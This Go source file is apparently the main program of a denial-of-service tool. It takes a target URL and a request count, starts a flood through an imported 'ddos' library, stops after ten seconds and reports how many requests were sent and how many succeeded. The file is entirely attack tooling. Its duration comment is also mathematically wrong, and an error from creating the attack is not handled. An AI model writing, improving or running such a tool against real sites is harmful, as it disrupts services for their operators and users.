package main

import (
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/francisco/ddos/ddos"
)

const duration time.Duration = 10000000000 // time in nanoseconds (10*e^-9 seconds)

func main() {
	url := os.Args[1]
	quantity := os.Args[2]

	quantityInt, _ := strconv.Atoi(quantity)

	fmt.Println("Starting...")
	fmt.Println("Server: ", url)
	atk, err := ddos.CreateDDOS(url, quantityInt)

	if err != nil {
		fmt.Println("Error to create a DDoS entity: ", err)
	}

	atk.Start()
	time.Sleep(duration)
	atk.Stop()

	amountReqs, successReqs := atk.Results()

	fmt.Println("Number of requests: ",amountReqs, "| Successful requests: " ,successReqs)
}
